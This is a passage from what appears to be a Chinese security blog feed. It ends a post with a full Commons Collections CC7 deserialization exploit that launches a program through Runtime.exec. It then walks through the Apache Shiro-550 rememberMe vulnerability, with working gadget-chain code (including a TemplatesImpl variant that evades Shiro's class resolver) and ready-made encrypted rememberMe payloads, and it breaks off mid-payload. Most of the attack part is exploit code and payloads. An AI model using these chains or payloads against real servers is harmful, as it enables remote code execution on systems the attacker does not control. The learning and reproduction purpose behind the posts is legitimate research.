<p><font style="color:rgb(51, 51, 51);">还有一个是我们</font><code>AbstractMap.equals()</code><font style="color:rgb(51, 51, 51);">中个数需要相同。</font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (m.size() != size())</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br></pre></td></tr></table></figure>

<h3 id="aCemO">在 map2 中remove掉 yy</h3>
<font style="color:rgb(80, 80, 92);">这是因为</font><font style="color:rgb(80, 80, 92);"> </font>`HashTable.put()`<font style="color:rgb(80, 80, 92);"> </font><font style="color:rgb(80, 80, 92);">实际上也会调用到</font><font style="color:rgb(80, 80, 92);"> </font>`equals()`<font style="color:rgb(80, 80, 92);"> </font><font style="color:rgb(80, 80, 92);">方法：</font>

<p><font style="color:rgb(80, 80, 92);">当调用完 </font><code>equals()</code><font style="color:rgb(80, 80, 92);"> 方法后，LazyMap2 的 key 中就会增加一个 yy 键：</font></p>
<h3 id="x6x4z"><font style="color:rgb(80, 80, 92);">put时弹计算器</font></h3>
虽然这不影响我们的序列化，但是总归是不好的，需要修改一下



<h2 id="xC9Rs">最终EXP</h2>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.review;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.AbstractMapDecorator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.AbstractMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC7</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">hashMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">hashMap2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap1</span> <span class="operator">=</span> LazyMap.decorate(hashMap1, chainedTransformer);</span><br><span class="line">        lazyMap1.put(<span class="string">&quot;yy&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap2</span> <span class="operator">=</span> LazyMap.decorate(hashMap2, chainedTransformer);</span><br><span class="line">        lazyMap2.put(<span class="string">&quot;zZ&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        hashtable.put(lazyMap1, <span class="number">1</span>);</span><br><span class="line">        hashtable.put(lazyMap2, <span class="number">1</span>);</span><br><span class="line">        lazyMap2.remove(<span class="string">&quot;yy&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Class&lt;ChainedTransformer&gt; chainedTransformerClass = ChainedTransformer.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">iTransformers</span> <span class="operator">=</span> chainedTransformerClass.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        iTransformers.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        iTransformers.set(chainedTransformer, transformers);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        serialize(hashtable);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734804558818-e8d82acc-d43c-4a72-86fb-ee0723feb6ac.png"></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>CC链</tag>
      </tags>
  </entry>
  <entry>
    <title>Shiro550</title>
    <url>/2025/03/03/Shiro550/</url>
    <content><![CDATA[<h1 id="DDElR">Shiro550</h1>
今天我们精进shiro的反序列化！！！

<p>之前有做过相关的shiro550与721的复现，不过都是利用工具的，没有理解里面的原理</p>
<p>550的话是由于他的密钥是固定的，是可以爆破的，经过Base64和AES解密以后，可以将里面的内容构造为恶意代码，从而达到RCE的目的</p>
<h2 id="BsFWJ">发现</h2>
![](https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735016085510-9edb1422-d5d2-49dc-8581-9dbd995c1e4e.png)
在登录界面有remember me的选项，勾选后点击登录抓包

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735016156894-ad6d98f6-4148-4301-a05e-ee9553b17993.png"></p>
<p>rememberMe字段中会有这么一大段东西，说明里面是存储着某些信息的，这些信息可以让我们下次不需要再次登录。我们这里可以去源码中看看进行了什么样的操作呢</p>
<p>在源码中找到了一个<code>CookieRememberMeManager</code>，应该就是它在管理这个Rememberme</p>
<p>在这个地方，将数据包中的cookie取出来进行base64解码，后返回解码的东西，我们看看谁调用了它</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735017435925-423b66ff-6436-4124-a8ce-89c401a24119.png"></p>
<p>找到在<code>getRememberedPrincipals</code>中调用了这个方法，将解码出来的字节，放入<code>convertBytesToPrincipals</code>方法中，我们跟进看一下（看名字就知道跟认证有关）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> PrincipalCollection <span class="title function_">getRememberedPrincipals</span><span class="params">(SubjectContext subjectContext)</span> &#123;</span><br><span class="line">        <span class="type">PrincipalCollection</span> <span class="variable">principals</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">byte</span>[] bytes = getRememberedSerializedIdentity(subjectContext);</span><br><span class="line">            <span class="comment">//SHIRO-138 - only call convertBytesToPrincipals if bytes exist:</span></span><br><span class="line">            <span class="keyword">if</span> (bytes != <span class="literal">null</span> &amp;&amp; bytes.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                principals = convertBytesToPrincipals(bytes, subjectContext);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RuntimeException re) &#123;</span><br><span class="line">            principals = onRememberedPrincipalFailure(re, subjectContext);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> principals;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这个方法内，对所传入的字节进行一个<strong>解密</strong>，然后将<strong>反序列化</strong>后的它返回了回去</p>
<p>这里的解密函数就是AES解密，反序列化也是调用了原生的readObject</p>
<p>如果说它带了cc的依赖，我们就可以打它的cc依赖</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> PrincipalCollection <span class="title function_">convertBytesToPrincipals</span><span class="params">(<span class="type">byte</span>[] bytes, SubjectContext subjectContext)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (getCipherService() != <span class="literal">null</span>) &#123;</span><br><span class="line">            bytes = decrypt(bytes);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> deserialize(bytes);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>大概流程如下，反序列化的点就在convertBytesToPrincipals中</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735018432588-cfe2debb-3ab5-4284-9f48-7b899ffcc280.png"></p>
<h2 id="SVcDS">攻击方式</h2>
<h3 id="nAXKz">URLDNS</h3>
由于shiro有cc依赖，但是在代码中没有import，所以cc的依赖没有办法打，我们先来验证一下，去打jdk自己的URLDNS链子

<p>先生成一个可用域名</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735019488981-1f10d404-cdc6-4cc4-9ccd-48234e27562a.png"></p>
<p>再去生成一个URLDNS链子的payload</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735019972386-7f641648-f410-43c1-8cb8-22e6be86b96e.png"></p>
<p>后续我们需要用脚本，对生成的payload进行AES加密，再进行base64加密（生成payload如下）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">GVpWKjIkTESUwYXtKFTtzBwv5gw1KjohG6Q1RBnlOtMF5aGvp6FnFFlyMyPhmvdWFyL8TLw8e34+65Sw3+c0jq0qop8ubQQtcAjHdZu2T6Nfleg7g7/sA0gOyaUCRpR5WYkqDo4/GxFwM2Qn22t0Dx6GogH20i0g19gGsHWT1Ng1LTa0TgvHKJvVT8L8wCWKh5RRncVyFLmVM6OUDuroPjw2NNIKspmj2RGD6yMCSBe3fon6nfFXnctFYO4oT7wxmL+3EKZ55HKdCRVXr4nlYnh+MU1KS9KUuuMrhdUFOCNHEcVEV7IXLBBXCwjM1yibRCgzXSGGojxNqvAO1wl4JeIRLLsVvzMbeokSS14xcmHPLQC25TmcdfgcFr91zWGDUg7zPR+8R/uCZf2hK/YoqFSKy6bqFYjuENfZ2YDbZTCZBk+tIF6YDcbkOU4eVnbaZRAmJMY2PR+fEPKzNcaZlkY720KjGE6G0YRCvLC+hUE=</span><br></pre></td></tr></table></figure>

<p>将paload放入数据包中的<strong>reMeberMe</strong>中，shiro就会对他进行反序列化操作从而触发URLDNS</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735024319706-e7e6fa38-06bc-489d-a916-a896ab265ea4.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735024405834-d70b431e-773e-4f89-9fc2-f6a1c7d952d3.png"></p>
<h3 id="SqMdJ">CC攻击链</h3>
<h4 id="E5WRm">环境配置</h4>
这里我们用cc3.2.1来搭建这个环境

<p>我们先来使用cc6来打一下这个shiro环境，看一下它是一个怎么样的效果</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">GjDw1BVbSzeG2ZRTiqsafqN5Woprm2vK0ocyatebZYZCU5Wu30PTYzojzumFhnlTQ5GTyzlGh+Pm3PL5pBzTdQNVgwBoa7PqqUh9oqU2IIJymF2XMaQPVq513mugvjFZ8ZC2UoHDaFvlDRUToAtLqcJpfUoRq52Gvx8v1fB9GyJm5iZSLfXMmXDznYPVltvFvdePbi0eXj2K/85Zq89TCfsfVU5h2vAwP4XiTkZAlJgaXbR3FuFDpDZbKHaMRMdN5dCVT0nqHuCX/kIayuy7AfiMJRIt+sW0EFSX8S8T6Xcs/mCPtqvsiI0Kuxxl5oJq1fDRAf/QX8ovcUPiH0JK76llM+xtfkq4CrzoaY+NFp6lYOTXKN9PU+sjcioO/3BODMqmjg0clQHQV4ici3uIJ2C18V9AiZIK8S/NBhbi+0pjDECD5iErgGF5EGvdl4D85+R8GwxX8qwykGokzno6hwfyPMe9+UdvTn1rjsIroPjhETlyOZNzFlqu8Zj1K52JydgbceL1F35RjKWJzGc7dEBzmJmQ6Cahd6ICdgLRImlBYr62LZM18CXqB9naxJ4lbekq4R1zCQ8KKhpqWaAYXaL2jBsVympOss2I/uB4DQGYBVYBNowkwFlG3/O3zlDz+G60BVUR4cQnNwWqAnEWTSgS7ZGWaCfQW4T3gg4Gv5ZuuvEek9Kwi+h4e6bcrHEq6A+WTlrgb0XS40yQF2bwleEeNggdwpTrGbjd3pLUCa00Tn/yWLzzuN/6TwpANBHDfEB3RrPdaQSNu7YOGPSe4xEH3l+sSJMuULdwr/Two0TDOU1E/X9Y0wJ0crm0d7MIkvnHfqk6SGtyUTVYfo2c81sSWuB/6AQL0L9eYVozGWkl6h9Ap4lYckTuI5L1i7klVSSqcl++P0W26RrDTcVUs0YHTQc0KoPcrjrJm6jvJjz8RqiaClyrGIBL3kuSmmOWPZWT9V9CPhpz0n08i402ZdcVJOAhYAPk3B6P1t4ViPl0gcUP/hUt/acHMnhZGqNSRO5lgTambJg4d+bH9HUky19NXu3jb4jM9vauu6lqcmG87x97/uOA4EJRcGf2iFZO+6k96gRhUY/AJ0O5aE8veJhwnyPzaCaJzAdQlp4kQrWG0dvhKLhLHwdjOkrvBmERfxN58fpQDl82VHrV76+8jTIDFUZxzr/a/7IIqpmimcK9gsv7dBKP8nMRLoY64C0FR92FhRTcGcrGYc+NZpGK08aXZK1/eWqi9RgV2LY+lFn8f1Gl6QsIzy7H6zSw9GLq9r2EMR/DthiuPLBlOciFL50RVMit0Ts+wtSRmb3/3U97OP2zDEWeBNno0zRmCgrl0Mja1LbI1wtmYCFqHKbp1aRhCxKlHe94rkv8kpNpJwp3arAJckGZxRdhdr3MqL0JwQm0BOlfqyiGV4Z/LbczMIcut+OXRjma4nT8jIdFEwfVGc3a9OxU2x37F++ewCRl4jBr7+7N2f6KmN0JOLe21wsCm4pl0AKO6ZldfOeyZrQeo6SQ/44jxbQ/cg79vmV5<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>

<h4 id="CdJT7">报错分析</h4>
将payload放入rememberMe后，服务器端爆出了一下错误，说无法加载Transformer这个类

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735025531998-d4316e0b-f014-4196-a7e1-34b0ac180998.png"></p>
<p>这里我们跟着源码去分析一下</p>
<p>这里找到报错的地方，这里它并不是调用了默认的字节输入流，而是调用了shiro自己写的一个<code>ClassResolvingObjectInputStream</code>，我们跟进去<code>ClassResolvingObjectInputStream</code>看一下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> T <span class="title function_">deserialize</span><span class="params">(<span class="type">byte</span>[] serialized)</span> <span class="keyword">throws</span> SerializationException &#123;</span><br><span class="line">        <span class="keyword">if</span> (serialized == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;argument cannot be null.&quot;</span>;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(msg);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(serialized);</span><br><span class="line">        <span class="type">BufferedInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(bais);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassResolvingObjectInputStream</span>(bis);</span><br><span class="line">            <span class="meta">@SuppressWarnings(&#123;&quot;unchecked&quot;&#125;)</span></span><br><span class="line">            <span class="type">T</span> <span class="variable">deserialized</span> <span class="operator">=</span> (T) ois.readObject();</span><br><span class="line">            ois.close();</span><br><span class="line">            <span class="keyword">return</span> deserialized;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;Unable to deserialze argument byte array.&quot;</span>;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SerializationException</span>(msg, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>在<code>ClassResolvingObjectInputStream</code>只有两个方法，一个构造方法我们就不看了，看一下另一个</p>
<p>这里的resolveClass的方法，是在<strong>反序列化</strong>时都会调用到的，在默认的<code>ObjectInputStream</code>也是有这个方法的，我们来对比一下</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735026166933-ce1f08e0-ac19-4016-8925-807be77b3869.png"></p>
<p>大概的差别就是<code>ClassResolvingObjectInputStream</code>调用的是<code>ClassUtils.forName(osc.getName());</code>，其中<code>ClassUtils</code>是shiro自定的一个工具类</p>
<p>而<code>ObjectInputStream</code>调用的是<code>Class.forName(name, false, latestUserDefinedLoader());</code></p>
<p>我们可以这样理解，Class.forName是可以对数组进行操作的，而ClassUtils.forName是不能对数组进行操作的，这就是报错的原因</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ClassResolvingObjectInputStream</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass osc) <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> ClassUtils.forName(osc.getName());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (UnknownClassException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(<span class="string">&quot;Unable to load ObjectStreamClass [&quot;</span> + osc + <span class="string">&quot;]: &quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ObjectInputStream</span></span><br><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc)</span><br><span class="line">        <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> desc.getName();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> Class.forName(name, <span class="literal">false</span>, latestUserDefinedLoader());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException ex) &#123;</span><br><span class="line">            Class&lt;?&gt; cl = primClasses.get(name);</span><br><span class="line">            <span class="keyword">if</span> (cl != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> cl;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">throw</span> ex;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<h4 id="JFsrD">报错调整</h4>
<font style="color:rgb(50, 50, 50);">这里我们不能利用数组了，因为cc1中调用Runtime.exec需要用</font>`<font style="color:rgb(50, 50, 50);">ChainedTransformer</font>`<font style="color:rgb(50, 50, 50);">和</font>`<font style="color:rgb(50, 50, 50);">ConstantTransformer</font>`<font style="color:rgb(50, 50, 50);">来更正返回值，所以我们选用动态类加载去加载恶意类，大概流程如下</font>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735027682629-1aafb1a0-90c1-4c90-919b-1c05b87b61d5.png"></p>
<p>接下来我们去改写一下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">tl</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> tl.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;CC3&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;F:\\temporary\\Test.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tl.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates, codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tl.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map1 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map1,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, templates);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map2.put(entry, <span class="string">&quot;qwe&quot;</span>);</span><br><span class="line">        lazyMap.remove(templates);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> LazyMap.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factory</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factory.set(lazyMap,invokerTransformer);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        serialize(map2);</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>然后老样子生成payload，放入remeberMe中（这个payload有点长，因为我们把整个类的东西都放进去了）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">z63yaT+pRKuWY/div9sA3wupuFtc2pvoYNv5xIQkya7wsuDr6wrIPxFV/ZjwFZiWaoQCvPy7TDK5+d+X8xkNocr08tLLfq7HMSSRFArD6F6S0+FcLzTXQpr2RiKCbmfV2i6vihz3ylcIhyHEn6XaUF7cKY5XNxjrrUxh2f1gsCGTX3NjU155fYuqM+ndqlh7/5140q9Fn0MIpWgZesq/eNfUYEA3iEcDv5VM+W5p/DDzvERg9rftFrzI60jkUZvxHqgF+LjLieNqbYMcZl0ah54n3IytkCfayN31QEqKxzqO8iHE7JNmPvzSclIZSuohjTHFLk+Um3Gh9MqMcgBeDrJFgP+KXkwIFCKTV7rEJku51b6WzXeOHrPAU07WSmoWnMZxasyVbGZSxkIj7SGdRZam+CtUt+1VtMtJvRP0J47R4js3SmvLFg5jy2ANNIuBxlemOsubsVlTbQM0bWjWm+bcX9cknFmCEtCT+chlqd7wAgoZmNm3E5UUAQKE4kTS4HLEUYpBkQrFg3NDqBx4i4Md7eMZvmBw0J8qlTLUIL1BYtBlo+g3Un3WPsmkDB3MUpcP7CBbwziwBfnzSgiC0eztsKGVb0FOO7ohs0qR9U6IodiqcwMvwmm+4Ts/i10cDj40VjhiNTYqIpEr0eo44/HSeR2BZHjMwTRM5z3W1o6bC8qtrlNxHqtClXzKGOtbZVJ2aeUe/fzU5EBiFx4joqhlfksS8pO0nEilUUPYaLd1UQ+JmozbIXxWnGRLk8eps3z+j6Lr4J9+rAgLbplTMrPF+avWO5OjonB3FCczFdXCysDahd4G/2CR599CYcHuAbHVOFEAQ56z3MdcIryqecxwUXQDGZF+8LqZX0N0AEwIjOLK2Xrto2dmkz0kgwU2lNn/fb8fusO1K4jV+lfGkB7Xvbu3EUS0WlK1jGBo/ORgIuxnRdi7TI1fYbMhxq5uwVlnlYLY7mtQSCtyEKqexn1h88fR4yrHAKD9JzhUP0J5Zxnpqndv0zOkV5U8rXM3lv0dwh7/WuHAypsGD5243nQmxDOwhYJSio/tx6IV77HJgaSVqQRUPte+ijoZ6hMAujEVkHFRuT+Nc1F+E7tj3Jd0akQ227Xoww5o7V1IzVGf+GfkSB8uCDfXT37T+1IsE8LPsMV9smrNcQ8BGQUONjgvtkVR4c6wO8ROUEFaJWaSl6taG82ULGQpJwfjvI8f9Gwg+wdnXO6P6IQZZlf830u9wCMDvU+aSpV+uKHuxpsvELZ3mceTZJbTaR3eQr8C8HDgM95r6pvDopVUFDoTXEXfygWa3vg4ObNXRogYAAu/X9XRuomozqMyrj/alu3acxNyLxeU9gV1O+K9kGMu4wTckcvvAUNR66qGw07jUVGWcMB5NJh6tOHXs7Tnz4gT1gkGf/6evQC1zrZNC4J4VCEJSFQ74J84hFmrx/quevaTLEW4D/7f4oJup6yb66CK973iu7gwC4ykD3bD8ib2r8wwHkWJ391B8Onf2OLwKJDnrF/qPZlxPOhJJObRY/Nq0BlKtb2Vu5D4ebVADzIKBkpZE4yWaOcqiIEzk01DH7UQiz+m59UNnHdGkCZP8rjLv6obRK1BEImjcxvPhg7oBIM45x1u3mFAh6X2VOFADsJOjRsp3obet0KutCwQY7hSdTVoR+fjNBAtKsPXXXsQVQ/+yJNB7UbkrnaqBxg3MOB5iw4zuCWCK3hSWP5EEDH2z5W145N68x3Z00wzutYJySe+mAAzWx6nyo1zO20v/bcB5OG+MjWjjqSupywC3y6ynLfQKGGouU5aa7rl8tLXuINFFqe+Ad6PRaZukJqOub8lDa/ZHbyYIRCVghmgpXMId9<span 